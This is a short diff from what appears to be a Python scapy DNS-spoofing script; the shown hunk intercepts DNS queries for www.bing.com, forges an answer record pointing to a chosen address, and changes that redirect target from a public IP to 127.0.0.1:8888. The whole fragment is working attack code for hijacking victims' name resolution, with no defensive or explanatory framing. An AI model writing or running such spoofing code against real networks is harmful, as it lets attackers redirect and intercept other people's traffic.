@@ -18,7 +18,7 @@ def process_packet(packet):
         qname = scapy_packet[scapy.DNSQR].qname
         if "www.bing.com" in qname:
             print("[+] Spoofing target ")
-            answer = scapy.DNSRR(rrname=qname, rdata="93.31.82.227:8888")#Put the IP address you want to be redirect
+            answer = scapy.DNSRR(rrname=qname, rdata="127.0.0.1:8888")#Put the IP address you want to be redirect
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
